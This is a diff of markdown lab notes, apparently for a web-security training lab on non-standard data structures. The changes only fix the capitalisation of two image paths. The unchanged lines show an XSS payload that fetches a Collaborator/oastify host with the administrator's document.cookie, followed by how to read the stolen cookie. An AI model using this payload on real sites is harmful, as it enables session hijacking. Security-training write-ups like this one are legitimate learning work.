@@ -16,7 +16,7 @@ Basically you are looking are for any non-standard data structures in the reques
 - It says there is XSS and it looks like: `'"><svg/onload=fetch...`
 	- Didn't work initially because the request showed two cookies, probably because I was screwing around too much
 - But I eventually got this: 
-![](assets/images/Essential%20Skills%20Labs/non-standard_data_structures_scan.png)
+![](assets/Images/Essential%20Skills%20Labs/non-standard_data_structures_scan.png)
 - `'%22%3e%3csvg%2fonload%3dfetch%60%2f%2fgcwxwkyw1nwnu10kmi9m5ezcy34wsmge62xski87%5c.oastify.com%60%3e`
 - which decodes to: 
 ```
@@ -27,5 +27,5 @@ Basically you are looking are for any non-standard data structures in the reques
 '"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
 ```
 - This will encode the `administrator`'s cookie and send it in the **request**:
-![](assets/images/Essential%20Skills%20Labs/non-standard_data_structures_admin_cookie.png)
+![](assets/Images/Essential%20Skills%20Labs/non-standard_data_structures_admin_cookie.png)
 - URL decode and you see the cookie. 
